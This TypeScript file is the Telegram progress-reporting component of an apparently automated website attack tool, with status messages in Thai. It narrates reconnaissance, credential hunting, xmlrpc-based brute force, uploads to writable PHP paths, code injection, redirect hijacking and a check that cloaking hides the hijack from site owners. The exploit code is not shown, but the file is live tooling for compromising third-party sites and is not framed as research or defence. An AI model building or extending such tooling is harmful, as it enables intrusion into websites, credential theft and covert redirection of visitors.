/**
 * TelegramNarrator — Real-time Thai step-by-step attack narration
 * 
 * แสดงผลแบบ Manus-style: ทุก step มี icon + label, 
 * ระหว่าง steps มีวิเคราะห์เป็นภาษาไทย, 
 * อัปเดตข้อความเดิมแบบ progressive
 */

// ═══════════════════════════════════════════════════════
//  Types
// ═══════════════════════════════════════════════════════

export interface NarratorStep {
  /** Step label (shown in ▶ badge) */
  label: string;
  /** Status of this step */
  status: "pending" | "running" | "done" | "failed" | "skipped";
  /** Thai analysis text shown after step completes */
  analysis?: string;
  /** Duration in ms */
  durationMs?: number;
  /** Extra data (e.g., found credentials, open ports) */
  data?: Record<string, any>;
}

export interface NarratorConfig {
  /** Target domain */
  domain: string;
  /** Attack method name */
  method: string;
  /** Telegram bot token */
  botToken: string;
  /** Chat ID to send messages */
  chatId: number;
  /** Optional: existing message ID to edit (if not provided, creates new) */
  messageId?: number;
  /** Max message length before splitting (Telegram limit ~4096) */
  maxLength?: number;
  /** Optional: total methods count for full_chain progress display */
  totalMethods?: number;
}

export type NarratorPhase = 
  | "recon"        // สำรวจเป้าหมาย
  | "vulnscan"     // Deep vulnerability scan
  | "credential"   // ค้นหา credentials
  | "bruteforce"   // brute force
  | "exploit"      // exploit ช่องโหว่
  | "upload"       // อัปโหลดไฟล์
  | "inject"       // inject code
  | "hijack"       // hijack redirect
  | "verify"       // ตรวจสอบผล
  | "complete"     // เสร็จสิ้น
  | "error";       // ข้อผิดพลาด

// ═══════════════════════════════════════════════════════
//  Phase Labels (Thai)
// ═══════════════════════════════════════════════════════

const PHASE_LABELS: Record<NarratorPhase, { emoji: string; thai: string }> = {
  recon:      { emoji: "🔍", thai: "สำรวจเป้าหมาย" },
  vulnscan:   { emoji: "🔬", thai: "Deep Vulnerability Scan" },
  credential: { emoji: "🔑", thai: "ค้นหา Credentials" },
  bruteforce: { emoji: "🔨", thai: "Brute Force" },
  exploit:    { emoji: "💉", thai: "Exploit ช่องโหว่" },
  upload:     { emoji: "📤", thai: "อัปโหลดไฟล์" },
  inject:     { emoji: "💊", thai: "Inject โค้ด" },
  hijack:     { emoji: "🔓", thai: "Hijack Redirect" },
  verify:     { emoji: "✅", thai: "ตรวจสอบผลลัพธ์" },
  complete:   { emoji: "🏁", thai: "เสร็จสิ้น" },
  error:      { emoji: "❌", thai: "ข้อผิดพลาด" },
};

// ═══════════════════════════════════════════════════════
//  Status Icons
// ═══════════════════════════════════════════════════════

const STATUS_ICON: Record<NarratorStep["status"], string> = {
  pending:  "⬜",
  running:  "▶",
  done:     "✅",
  failed:   "❌",
  skipped:  "⏭",
};

// ═══════════════════════════════════════════════════════
//  Thai Analysis Templates
// ═══════════════════════════════════════════════════════

export function generateReconAnalysis(data: {
  httpStatus?: number;
  isWordPress?: boolean;
  wpVersion?: string;
  themes?: string[];
  plugins?: string[];
  hasXmlrpc?: boolean;
  hasRestApi?: boolean;
  server?: string;
  waf?: string;
  openPorts?: number[];
  cloudflare?: boolean;
}): string {
  const parts: string[] = [];

  if (data.httpStatus) {
    parts.push(`เว็บไซต์ตอบสนอง HTTP ${data.httpStatus}`);
  }

  if (data.isWordPress === true) {
    parts.push(`ยืนยันว่าใช้ WordPress${data.wpVersion ? ` เวอร์ชัน ${data.wpVersion}` : ""}`);
    if (data.themes?.length) {
      parts.push(`ธีม: ${data.themes.join(", ")}`);
    }
    if (data.plugins?.length) {
      parts.push(`ปลั๊กอิน: ${data.plugins.slice(0, 5).join(", ")}${data.plugins.length > 5 ? ` (+${data.plugins.length - 5} อื่นๆ)` : ""}`);
    }
  } else if (data.isWordPress === false) {
    parts.push("ไม่พบสัญญาณ WordPress ชัดเจน");
  }

  if (data.hasXmlrpc) {
    parts.push("พบ xmlrpc.php — สามารถใช้ multicall brute force ได้");
  }
  if (data.hasRestApi) {
    parts.push("พบ REST API endpoint — สามารถ enumerate users ได้");
  }

  if (data.cloudflare) {
    parts.push("อยู่หลัง Cloudflare — ต้องใช้เทคนิค bypass");
  }
  if (data.waf) {
    parts.push(`ตรวจพบ WAF: ${data.waf}`);
  }

  if (data.openPorts?.length) {
    const portNames: Record<number, string> = { 21: "FTP", 22: "SSH", 2082: "cPanel", 2083: "cPanel SSL", 3306: "MySQL", 8080: "PHPMyAdmin", 8443: "PHPMyAdmin SSL" };
    const named = data.openPorts.map(p => portNames[p] ? `${portNames[p]}(${p})` : String(p));
    parts.push(`พอร์ตที่เปิด: ${named.join(", ")}`);
  }

  if (parts.length === 0) return "กำลังรวบรวมข้อมูลเพิ่มเติม...";
  return parts.join(" | ");
}

export function generateCredentialAnalysis(data: {
  usersFound?: string[];
  techniquesUsed?: number;
  techniquesSucceeded?: number;
  credentialsFound?: number;
  methods?: string[];
}): string {
  const parts: string[] = [];

  if (data.usersFound?.length) {
    parts.push(`พบ ${data.usersFound.length} ผู้ใช้: ${data.usersFound.slice(0, 5).join(", ")}`);
  }
  if (data.techniquesUsed) {
    parts.push(`ใช้ ${data.techniquesSucceeded || 0}/${data.techniquesUsed} เทคนิคสำเร็จ`);
  }
  if (data.credentialsFound) {
    parts.push(`สร้าง ${data.credentialsFound} ชุด credentials สำหรับทดสอบ`);
  }
  if (data.methods?.length) {
    parts.push(`วิธี: ${data.methods.join(", ")}`);
  }

  return parts.length > 0 ? parts.join(" | ") : "กำลังค้นหา credentials...";
}

export function generateBruteForceAnalysis(data: {
  totalPasswords?: number;
  testedCount?: number;
  speed?: number;
  method?: string;
  found?: boolean;
  username?: string;
}): string {
  const parts: string[] = [];

  if (data.method) {
    parts.push(`ใช้ ${data.method}`);
  }
  if (data.totalPasswords && data.testedCount) {
    const pct = Math.round((data.testedCount / data.totalPasswords) * 100);
    parts.push(`ทดสอบแล้ว ${data.testedCount}/${data.totalPasswords} (${pct}%)`);
  }
  if (data.speed) {
    parts.push(`ความเร็ว: ${data.speed} passwords/sec`);
  }
  if (data.found && data.username) {
    parts.push(`พบรหัสผ่านของ ${data.username}!`);
  }

  return parts.length > 0 ? parts.join(" | ") : "กำลัง brute force...";
}

export function generateUploadAnalysis(data: {
  method?: string;
  path?: string;
  statusCode?: number;
  success?: boolean;
  fileUrl?: string;
}): string {
  const parts: string[] = [];

  if (data.method) {
    parts.push(`วิธี: ${data.method}`);
  }
  if (data.path) {
    parts.push(`เส้นทาง: ${data.path}`);
  }
  if (data.statusCode) {
    parts.push(`HTTP ${data.statusCode}`);
  }
  if (data.success && data.fileUrl) {
    parts.push(`อัปโหลดสำเร็จ: ${data.fileUrl.substring(0, 60)}`);
  } else if (data.success === false) {
    parts.push("อัปโหลดไม่สำเร็จ");
  }

  return parts.length > 0 ? parts.join(" | ") : "กำลังอัปโหลด...";
}

export function generateHijackAnalysis(data: {
  method?: string;
  success?: boolean;
  detail?: string;
  originalUrl?: string;
  newUrl?: string;
}): string {
  const parts: string[] = [];

  if (data.method) {
    parts.push(`วิธี: ${data.method}`);
  }
  if (data.detail) {
    parts.push(data.detail);
  }
  if (data.success && data.newUrl) {
    parts.push(`เปลี่ยน redirect เป็น ${data.newUrl.substring(0, 50)} สำเร็จ`);
  }
  if (data.originalUrl) {
    parts.push(`redirect เดิม: ${data.originalUrl.substring(0, 50)}`);
  }

  return parts.length > 0 ? parts.join(" | ") : "กำลัง hijack...";
}

export function generateVerifyAnalysis(data: {
  redirectWorks?: boolean;
  redirectUrl?: string;
  cloakingWorks?: boolean;
  normalSiteWorks?: boolean;
  fileAccessible?: boolean;
}): string {
  const parts: string[] = [];

  if (data.redirectWorks !== undefined) {
    parts.push(`Redirect: ${data.redirectWorks ? "✅ ทำงาน" : "❌ ไม่ทำงาน"}`);
  }
  if (data.redirectUrl) {
    parts.push(`ปลายทาง: ${data.redirectUrl.substring(0, 50)}`);
  }
  if (data.cloakingWorks !== undefined) {
    parts.push(`Cloaking: ${data.cloakingWorks ? "✅ ซ่อนได้" : "❌ ไม่ซ่อน"}`);
  }
  if (data.normalSiteWorks !== undefined) {
    parts.push(`เว็บปกติ: ${data.normalSiteWorks ? "✅ ยังเข้าได้" : "⚠️ มีปัญหา"}`);
  }
  if (data.fileAccessible !== undefined) {
    parts.push(`ไฟล์: ${data.fileAccessible ? "✅ เข้าถึงได้" : "❌ เข้าไม่ได้"}`);
  }

  return parts.length > 0 ? parts.join(" | ") : "กำลังตรวจสอบ...";
}

export function generateVulnScanAnalysis(data: {
  serverInfo?: { server?: string; phpVersion?: string; waf?: string | null; cdn?: string | null; os?: string; ssl?: boolean };
  cms?: { type?: string; version?: string; plugins?: string[]; themes?: string[]; vulnerableComponents?: string[]; adminUrl?: string };
  writablePaths?: Array<{ path: string; verified: boolean; allowsPhp?: boolean }>;
  uploadEndpoints?: Array<{ url: string; acceptsPhp?: boolean; authRequired?: boolean; verified?: boolean }>;
  exposedPanels?: Array<{ url: string; type: string; authRequired?: boolean; defaultCreds?: boolean }>;
  misconfigurations?: Array<{ type: string; severity?: string; exploitable?: boolean }>;
  attackVectors?: Array<{ name: string; successProbability: number; technique?: string; aiReasoning?: string }>;
  totalVulns?: number;
  criticalVulns?: number;
  highVulns?: number;
  exploitableVulns?: number;
  scanDuration?: number;
}): string {
  const parts: string[] = [];

  // Server info
  if (data.serverInfo) {
    const si = data.serverInfo;
    const serverParts: string[] = [];
    if (si.server) serverParts.push(si.server);
    if (si.phpVersion) serverParts.push(`PHP ${si.phpVersion}`);
    if (si.os) serverParts.push(si.os);
    if (serverParts.length) parts.push(`เซิร์ฟเวอร์: ${serverParts.join(" | ")}`);
    if (si.waf) parts.push(`⚠️ WAF: ${si.waf}`);
    if (si.cdn) parts.push(`CDN: ${si.cdn}`);
  }

  // CMS
  if (data.cms) {
    const c = data.cms;
    if (c.type && c.type !== "unknown") {
      parts.push(`CMS: ${c.type}${c.version ? ` v${c.version}` : ""}`);
      if (c.plugins?.length) parts.push(`ปลั๊กอิน: ${c.plugins.slice(0, 5).join(", ")}${c.plugins.length > 5 ? ` (+${c.plugins.length - 5})` : ""}`);
      if (c.vulnerableComponents?.length) parts.push(`❌ ช่องโหว่: ${c.vulnerableComponents.slice(0, 3).join(", ")}`);
      if (c.adminUrl) parts.push(`Admin: ${c.adminUrl}`);
    } else {
      parts.push("ไม่พบ CMS ที่รู้จัก");
    }
  }

  // Writable paths
  if (data.writablePaths?.length) {
    const verified = data.writablePaths.filter(p => p.verified);
    const phpPaths = data.writablePaths.filter(p => p.allowsPhp);
    parts.push(`📂 Writable paths: ${data.writablePaths.length} (ยืนยัน ${verified.length}, PHP ${phpPaths.length})`);
  }

  // Upload endpoints
  if (data.uploadEndpoints?.length) {
    const noAuth = data.uploadEndpoints.filter(e => !e.authRequired);
    parts.push(`📤 Upload endpoints: ${data.uploadEndpoints.length} (ไม่ต้อง auth: ${noAuth.length})`);
  }

  // Exposed panels
  if (data.exposedPanels?.length) {
    const types = data.exposedPanels.map(p => p.type);
    parts.push(`🛡️ Panels: ${Array.from(new Set(types)).join(", ")}`);
  }

  // Misconfigurations
  if (data.misconfigurations?.length) {
    const exploitable = data.misconfigurations.filter(m => m.exploitable);
    parts.push(`⚠️ Misconfig: ${data.misconfigurations.length} (ใช้ได้: ${exploitable.length})`);
  }

  // Attack vectors
  if (data.attackVectors?.length) {
    const top3 = data.attackVectors.slice(0, 3);
    parts.push(`🎯 Top vectors: ${top3.map(v => `${v.name} (${Math.round(v.successProbability * 100)}%)`).join(", ")}`);
  }

  // Summary stats
  if (data.totalVulns !== undefined) {
    parts.push(`รวม: ${data.totalVulns} ช่องโหว่ (Critical: ${data.criticalVulns || 0}, High: ${data.highVulns || 0}, Exploitable: ${data.exploitableVulns || 0})`);
  }

  if (data.scanDuration) {
    parts.push(`ใช้เวลา: ${(data.scanDuration / 1000).toFixed(1)}s`);
  }

  return parts.length > 0 ? parts.join("\n") : "กำลังสแกน...";
}

// ═══════════════════════════════════════════════════════
//  TelegramNarrator Class
// ═══════════════════════════════════════════════════════

export class TelegramNarrator {
  private config: NarratorConfig;
  private steps: NarratorStep[] = [];
  private currentPhase: NarratorPhase = "recon";
  private messageId: number | null;
  private startTime: number;
  private lastEditTime: number = 0;
  private editQueue: Promise<void> = Promise.resolve();
  private phaseAnalysis: Map<string, string> = new Map();
  private currentMethodIndex: number = 0;
  private currentMethodName: string = "";
  private methodResults: Array<{ name: string; icon: string; success: boolean }> = [];
  
  /** Minimum interval between edits (ms) to avoid Telegram rate limits */
  private static MIN_EDIT_INTERVAL = 2000;
  /** Counter for unique analysis keys */
  private analysisCounter: number = 0;
  
  /** Heartbeat timer — auto-updates message every HEARTBEAT_INTERVAL ms */
  private heartbeatTimer: ReturnType<typeof setInterval> | null = null;
  private static HEARTBEAT_INTERVAL = 30_000; // 30 seconds
  private heartbeatCount: number = 0;
  private isCompleted: boolean = false;

  constructor(config: NarratorConfig) {
    this.config = config;
    this.messageId = config.messageId || null;
    this.startTime = Date.now();
  }

  // ─── Public API ───

  /** Initialize narrator — sends first message and starts heartbeat */
  async init(): Promise<number | null> {
    const header = this.buildHeader();
    const text = `${header}\n\n⏳ กำลังเตรียมพร้อม...`;
    
    if (this.messageId) {
      await this.editMessage(text);
    } else {
      this.messageId = await this.sendAndGetId(text);
    }
    
    // Start heartbeat timer
    this.startHeartbeat();
    
    return this.messageId;
  }

  /** Start a new phase */
  async startPhase(phase: NarratorPhase, customLabel?: string): Promise<void> {
    this.currentPhase = phase;
    const phaseInfo = PHASE_LABELS[phase];
    const label = customLabel || `${phaseInfo.emoji} ${phaseInfo.thai}`;
    
    this.steps.push({
      label,
      status: "running",
    });
    
    await this.updateMessage();
  }

  /** Add a sub-step within current phase */
  async addStep(label: string, status: NarratorStep["status"] = "running"): Promise<number> {
    // Auto-complete previous running steps to prevent accumulation
    // (keeps at most 1 running step at a time)
    for (let i = this.steps.length - 1; i >= 0; i--) {
      if (this.steps[i].status === "running") {
        this.steps[i].status = "done";
        break; // Only complete the most recent running step
      }
    }
    const idx = this.steps.length;
    this.steps.push({ label, status });
    await this.updateMessage();
    return idx;
  }

  /** Update a step's status and optionally add analysis */
  async updateStep(index: number, status: NarratorStep["status"], analysis?: string, durationMs?: number): Promise<void> {
    if (index >= 0 && index < this.steps.length) {
      this.steps[index].status = status;
      if (analysis) this.steps[index].analysis = analysis;
      if (durationMs !== undefined) this.steps[index].durationMs = durationMs;
    }
    await this.updateMessage();
  }

  /** Complete the last step and add analysis */
  async completeLastStep(status: NarratorStep["status"], analysis?: string, durationMs?: number): Promise<void> {
    const lastIdx = this.steps.length - 1;
    if (lastIdx >= 0) {
      await this.updateStep(lastIdx, status, analysis, durationMs);
    }
  }

  /** Add analysis text for current phase (shown between steps) */
  async addAnalysis(text: string): Promise<void> {
    // Use unique counter key so multiple analyses per step don't overwrite each other
    this.analysisCounter++;
    const key = `analysis_u${this.analysisCounter}`;
    const stepIdx = this.steps.length;
    // Store with step index for rendering
    this.phaseAnalysis.set(key, `${stepIdx}|${text}`);
    
    // Keep max 3 analyses per step (remove oldest for this step)
    const keysForStep: string[] = [];
    const entries = Array.from(this.phaseAnalysis.entries());
    for (const [k, v] of entries) {
      if (k.startsWith("analysis_u")) {
        const pi = v.indexOf("|");
        if (pi !== -1 && parseInt(v.substring(0, pi), 10) === stepIdx) {
          keysForStep.push(k);
        }
      }
    }
    while (keysForStep.length > 3) {
      this.phaseAnalysis.delete(keysForStep.shift()!);
    }
    
    // Prune analyses for old steps (keep only last 5 steps' analyses)
    if (stepIdx > 5) {
      const pruneEntries = Array.from(this.phaseAnalysis.entries());
      for (const [k, v] of pruneEntries) {
        if (k.startsWith("analysis_u")) {
          const pi = v.indexOf("|");
          if (pi !== -1 && parseInt(v.substring(0, pi), 10) < stepIdx - 4) {
            this.phaseAnalysis.delete(k);
          }
        }
      }
    }
    
    await this.updateMessage();
  }

  /** Mark attack as complete with final summary */
  async complete(success: boolean, summary: string): Promise<void> {
    this.stopHeartbeat();
    this.isCompleted = true;
    this.currentPhase = "complete";
    const elapsed = Date.now() - this.startTime;
    
    const finalText = this.buildFinalMessage(success, summary, elapsed);
    await this.editMessage(finalText);
    
    // Send separate notification (edit doesn't trigger push)
    const notifIcon = success ? "✅" : "❌";
    const notifText = `🔔 ${success ? "สำเร็จ" : "ล้มเหลว"}!\n\n${notifIcon} ${this.config.domain}\n📋 ${summary}\n⏱ ${formatDurationThai(elapsed)}`;
    await this.sendMessage(notifText);
  }

  /** Mark attack as failed with error */
  async fail(error: string): Promise<void> {
    this.stopHeartbeat();
    this.isCompleted = true;
    this.currentPhase = "error";
    const elapsed = Date.now() - this.startTime;
    
    // Mark last running step as failed
    const lastRunning = this.steps.findLastIndex(s => s.status === "running");
    if (lastRunning >= 0) {
      this.steps[lastRunning].status = "failed";
      this.steps[lastRunning].analysis = error;
    }
    
    const finalText = this.buildFinalMessage(false, error, elapsed);
    await this.editMessage(finalText);
    
    await this.sendMessage(
      `🔔 โจมตีล้มเหลว\n\n❌ ${this.config.domain}\n⚠️ ${error.substring(0, 100)}\n⏱ ${formatDurationThai(elapsed)}`
    );
  }

  /** Get current message ID */
  getMessageId(): number | null {
    return this.messageId;
  }

  /** Get elapsed time */
  getElapsed(): number {
    return Date.now() - this.startTime;
  }

  /** Set current method progress for full_chain display */
  setMethodProgress(index: number, name: string, icon: string): void {
    this.currentMethodIndex = index;
    this.currentMethodName = `${icon} ${name}`;
  }

  /** Record method result for summary display */
  recordMethodResult(name: string, icon: string, success: boolean): void {
    this.methodResults.push({ name, icon, success });
  }

  /** Get method results */
  getMethodResults(): Array<{ name: string; icon: string; success: boolean }> {
    return this.methodResults;
  }

  // ─── Message Building ───

  private buildHeader(): string {
    const phaseInfo = PHASE_LABELS[this.currentPhase];
    const elapsed = Date.now() - this.startTime;
    let header = `⚔️ โจมตี: ${this.config.domain}\n${phaseInfo.emoji} ${phaseInfo.thai} | ⏱ ${formatDurationThai(elapsed)}`;
    
    // Show method counter for full_chain
    if (this.config.totalMethods && this.currentMethodIndex > 0) {
      header += `\n🎯 ${this.currentMethodName} (${this.currentMethodIndex}/${this.config.totalMethods})`;
    }
    
    return header;
  }

  private buildStepsText(): string {
    let text = "";
    
    // ── Step pruning: only show last MAX_VISIBLE_STEPS to keep message short ──
    const MAX_VISIBLE_STEPS = 8;
    const totalSteps = this.steps.length;
    const startIdx = Math.max(0, totalSteps - MAX_VISIBLE_STEPS);
    
    // Show summary of hidden steps
    if (startIdx > 0) {
      const hiddenDone = this.steps.slice(0, startIdx).filter(s => s.status === "done" || s.status === "skipped").length;
      const hiddenFailed = this.steps.slice(0, startIdx).filter(s => s.status === "failed").length;
      text += `\n📊 ขั้นตอนก่อนหน้า: ✅${hiddenDone} ❌${hiddenFailed} (${startIdx} steps)`;
    }
    
    for (let i = startIdx; i < totalSteps; i++) {
      const step = this.steps[i];
      const icon = STATUS_ICON[step.status];
      const duration = step.durationMs ? ` (${formatDurationThai(step.durationMs)})` : "";
      
      text += `\n${icon} ${step.label}${duration}`;
      
      // Show analysis after completed/failed steps
      if (step.analysis && (step.status === "done" || step.status === "failed")) {
        // Truncate long analysis to prevent message overflow
        const truncAnalysis = step.analysis.length > 150 ? step.analysis.substring(0, 147) + "..." : step.analysis;
        text += `\n   └─ ${truncAnalysis}`;
      }
      
      // Show phase analysis after this step (collect all analyses tagged for this step index)
      // Only show analyses for visible steps
      const stepEntries = Array.from(this.phaseAnalysis.entries());
      let analysisCount = 0;
      for (const [key, val] of stepEntries) {
        if (key.startsWith("analysis_u")) {
          const pipeIdx = val.indexOf("|");
          if (pipeIdx === -1) continue;
          const stepIdx = parseInt(val.substring(0, pipeIdx), 10);
          const analysisText = val.substring(pipeIdx + 1);
          if (stepIdx === i + 1 && analysisCount < 2) {
            const truncText = analysisText.length > 120 ? analysisText.substring(0, 117) + "..." : analysisText;
            text += `\n   └─ ${truncText}`;
            analysisCount++;
          }
        }
      }
    }
    
    return text;
  }
  private buildProgressBar(): string {
    // For full_chain: use method-level progress instead of step-level
    if (this.config.totalMethods && this.methodResults.length > 0) {
      const totalM = this.config.totalMethods;
      const tried = this.methodResults.length;
      const succeeded = this.methodResults.filter(r => r.success).length;
      const pct = Math.round((tried / Math.max(totalM, 1)) * 100);
      const barLen = 12;
      const filled = Math.round((pct / 100) * barLen);
      const bar = "█".repeat(filled) + "░".repeat(barLen - filled);
      
      const spinner = buildSpinner(Date.now() - this.startTime);
      let statusText = this.currentMethodIndex <= totalM
        ? `${spinner} กำลังโจมตี...`
        : (succeeded > 0 ? `✅ สำเร็จ ${succeeded} วิธี` : `❌ ล้มเหลวทั้งหมด`);
      
      // Mini summary of recent results
      const recent = this.methodResults.slice(-3);
      const recentText = recent.map(r => `${r.success ? "✅" : "❌"}${r.icon}`).join(" ");
      
      return `\n[█${bar}] ${pct}% | ลองแล้ว ${tried}/${totalM} ${statusText}\nล่าสุด: ${recentText}`;
    }
    
    // Default: step-level progress
    const total = this.steps.length;
    const done = this.steps.filter(s => s.status === "done" || s.status === "skipped").length;
    const failed = this.steps.filter(s => s.status === "failed").length;
    const running = this.steps.filter(s => s.status === "running").length;
    
    if (total === 0) return "";
    
    const pct = Math.round(((done + failed) / Math.max(total, 1)) * 100);
    const barLen = 10;
    const filled = Math.round((pct / 100) * barLen);
    const bar = "█".repeat(filled) + "░".repeat(barLen - filled);
    
    let statusText = "";
    if (running > 0) {
      const spinner = buildSpinner(Date.now() - this.startTime);
      statusText = `${spinner} กำลังทำงาน...`;
    } else if (failed > 0 && done === 0) {
      statusText = "❌ ล้มเหลว";
    } else {
      statusText = `✅ ${done}/${total} สำเร็จ`;
    }
    
    return `\n[█${bar}] ${pct}% ${statusText}`;
  }

  private buildCurrentMessage(): string {
    const header = this.buildHeader();
    const progress = this.buildProgressBar();
    const steps = this.buildStepsText();
    const heartbeat = this.buildHeartbeatFooter();
    
    let text = `${header}${progress}\n${steps}${heartbeat}`;
    
    // Trim to Telegram limit
    const maxLen = this.config.maxLength || 4000;
    if (text.length > maxLen) {
      // Keep header + last N steps
      const headerPart = `${header}${progress}\n\n... (ข้ามขั้นตอนก่อนหน้า)\n`;
      const remaining = maxLen - headerPart.length;
      const stepsLines = steps.split("\n");
      let trimmedSteps = "";
      for (let i = stepsLines.length - 1; i >= 0; i--) {
        const candidate = stepsLines[i] + "\n" + trimmedSteps;
        if (candidate.length > remaining) break;
        trimmedSteps = candidate;
      }
      text = headerPart + trimmedSteps;
    }
    
    return text;
  }

  private buildFinalMessage(success: boolean, summary: string, elapsed: number): string {
    const icon = success ? "✅" : "❌";
    const statusText = success ? "สำเร็จ" : "ล้มเหลว";
    
    let text = `${icon} โจมตี${statusText}: ${this.config.domain}\n`;
    text += `📋 Method: ${this.config.method}\n`;
    text += `⏱ รวมเวลา: ${formatDurationThai(elapsed)}\n`;
    text += `\n━━━━━━━━━━━━━━━━━━━━\n`;
    
    // All steps summary
    for (const step of this.steps) {
      const icon = STATUS_ICON[step.status];
      const duration = step.durationMs ? ` (${formatDurationThai(step.durationMs)})` : "";
      text += `${icon} ${step.label}${duration}\n`;
      if (step.analysis) {
        text += `   └─ ${step.analysis}\n`;
      }
    }
    
    text += `\n━━━━━━━━━━━━━━━━━━━━\n`;
    text += `📝 สรุป: ${summary}`;
    
    // Trim
    if (text.length > 4000) {
      text = text.substring(0, 3990) + "\n...";
    }
    
    return text;
  }

  // ─── Heartbeat ───

  /** Start heartbeat timer — auto-updates message every 30s to show pipeline is alive */
  private startHeartbeat(): void {
    if (this.heartbeatTimer) return; // Already running
    
    this.heartbeatTimer = setInterval(async () => {
      if (this.isCompleted) {
        this.stopHeartbeat();
        return;
      }
      
      this.heartbeatCount++;
      
      // Force message update by changing heartbeat count (changes the footer text)
      try {
        await this.updateMessage();
      } catch {
        // Heartbeat update failed — not critical, will retry next interval
      }
    }, TelegramNarrator.HEARTBEAT_INTERVAL);
  }

  /** Stop heartbeat timer */
  stopHeartbeat(): void {
    if (this.heartbeatTimer) {
      clearInterval(this.heartbeatTimer);
      this.heartbeatTimer = null;
    }
  }

  /** Build heartbeat footer line showing elapsed time and alive indicator */
  private buildHeartbeatFooter(): string {
    if (this.isCompleted) return "";
    
    const elapsed = Date.now() - this.startTime;
    const elapsedStr = formatDurationThai(elapsed);
    
    // Animated pulse indicator that changes each heartbeat
    const pulseFrames = ["❤️", "🧡", "💛", "💚", "💙", "💜"];
    const pulse = pulseFrames[this.heartbeatCount % pulseFrames.length];
    
    // Activity description based on current phase
    const phaseInfo = PHASE_LABELS[this.currentPhase];
    const activity = phaseInfo ? `${phaseInfo.emoji} ${phaseInfo.thai}` : "กำลังทำงาน";
    
    return `\n\n────────────────────\n${pulse} ระบบทำงานอยู่ | ⏱ ${elapsedStr}`;
  }

  // ─── Telegram API ───

  /** Track last sent text to avoid "message is not modified" errors */
  private lastSentText: string = "";
  /** Track consecutive edit failures */
  private consecutiveEditFailures: number = 0;
  /** Whether we're currently processing an edit */
  private editInProgress: boolean = false;
  /** Pending edit text (latest wins — we only need the most recent state) */
  private pendingEditText: string | null = null;

  private async updateMessage(): Promise<void> {
    // Build the latest message text
    const text = this.buildCurrentMessage();
    
    // Skip if text hasn't changed (avoids Telegram "message is not modified" error)
    if (text === this.lastSentText) return;
    
    // If an edit is already in progress, just store the latest text
    // The in-progress edit will pick it up when done
    this.pendingEditText = text;
    
    if (this.editInProgress) return;
    
    // Process edits one at a time
    this.editInProgress = true;
    try {
      while (this.pendingEditText !== null) {
        const textToSend = this.pendingEditText;
        this.pendingEditText = null; // Clear pending — new calls will set it again
        
        // Rate limit: wait if needed
        const now = Date.now();
        const timeSinceLastEdit = now - this.lastEditTime;
        if (timeSinceLastEdit < TelegramNarrator.MIN_EDIT_INTERVAL) {
          await sleep(TelegramNarrator.MIN_EDIT_INTERVAL - timeSinceLastEdit);
        }
        
        // Skip if same as last sent (could happen if multiple updates queued)
        if (textToSend === this.lastSentText) continue;
        
        const ok = await this.editMessage(textToSend);
        if (ok) {
          this.lastSentText = textToSend;
          this.lastEditTime = Date.now();
          this.consecutiveEditFailures = 0;
        } else {
          this.consecutiveEditFailures++;
          // If too many failures, try sending a NEW message instead of editing
          if (this.consecutiveEditFailures >= 5) {
            console.warn(`[Narrator] ${this.consecutiveEditFailures} consecutive edit failures — sending new message`);
            const newId = await this.sendAndGetId(textToSend);
            if (newId) {
              this.messageId = newId;
              this.lastSentText = textToSend;
              this.consecutiveEditFailures = 0;
              console.log(`[Narrator] Switched to new message ID: ${newId}`);
            }
          }
        }
      }
    } catch (err: any) {
      console.warn(`[Narrator] updateMessage error: ${err.message}`);
    } finally {
      this.editInProgress = false;
    }
  }

  private async editMessage(text: string): Promise<boolean> {
    if (!this.messageId) {
      console.warn(`[Narrator] editMessage called but no messageId`);
      return false;
    }
    
    try {
      const url = `https://api.telegram.org/bot${this.config.botToken}/editMessageText`;
      
      const resp = await fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: this.config.chatId,
          message_id: this.messageId,
          text,
        }),
        signal: AbortSignal.timeout(8000),
      });
      const result = await resp.json() as any;
      
      if (result.ok) return true;
      
      // Handle specific Telegram errors
      const desc = result.description || "";
      if (desc.includes("message is not modified")) {
        // Not really an error — text was same
        this.lastSentText = text;
        return true;
      }
      if (desc.includes("Too Many Requests")) {
        // Rate limited — extract retry_after and wait
        const retryAfter = result.parameters?.retry_after || 3;
        console.warn(`[Narrator] Rate limited, waiting ${retryAfter}s`);
        await sleep(retryAfter * 1000);
        // Retry once
        try {
          const resp2 = await fetch(url, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: this.config.chatId, message_id: this.messageId, text }),
            signal: AbortSignal.timeout(8000),
          });
          const result2 = await resp2.json() as any;
          return result2.ok === true;
        } catch {
          return false;
        }
      }
      if (desc.includes("message to edit not found") || desc.includes("MESSAGE_ID_INVALID")) {
        // Message was deleted — send new one
        console.warn(`[Narrator] Message not found, sending new`);
        const newId = await this.sendAndGetId(text);
        if (newId) {
          this.messageId = newId;
          this.lastSentText = text;
          return true;
        }
        return false;
      }
      
      console.warn(`[Narrator] editMessage failed: ${desc}`);
      return false;
    } catch (err: any) {
      console.warn(`[Narrator] editMessage error: ${err.message}`);
      return false;
    }
  }

  private async sendMessage(text: string): Promise<boolean> {
    try {
      const url = `https://api.telegram.org/bot${this.config.botToken}/sendMessage`;
      const resp = await fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: this.config.chatId,
          text,
        }),
        signal: AbortSignal.timeout(10000),
      });
      const result = await resp.json() as any;
      return result.ok === true;
    } catch {
      return false;
    }
  }

  private async sendAndGetId(text: string): Promise<number | null> {
    try {
      const url = `https://api.telegram.org/bot${this.config.botToken}/sendMessage`;
      const resp = await fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: this.config.chatId,
          text,
        }),
        signal: AbortSignal.timeout(10000),
      });
      const result = await resp.json() as any;
      return result.ok ? result.result.message_id : null;
    } catch {
      return null;
    }
  }
}

// ═══════════════════════════════════════════════════════
//  Narrated Attack Runners
//  — Wrap each attack method with TelegramNarrator
// ═══════════════════════════════════════════════════════

export interface NarratedAttackOptions {
  domain: string;
  method: string;
  botToken: string;
  chatId: number;
  redirectUrl: string;
}

/**
 * Run full_chain attack with Thai narration
 */
export async function narrateFullChainAttack(opts: NarratedAttackOptions): Promise<{
  narrator: TelegramNarrator;
  success: boolean;
  result: any;
}> {
  const narrator = new TelegramNarrator({
    domain: opts.domain,
    method: "full_chain",
    botToken: opts.botToken,
    chatId: opts.chatId,
  });
  
  await narrator.init();
  
  // Phase 1: Recon
  await narrator.startPhase("recon");
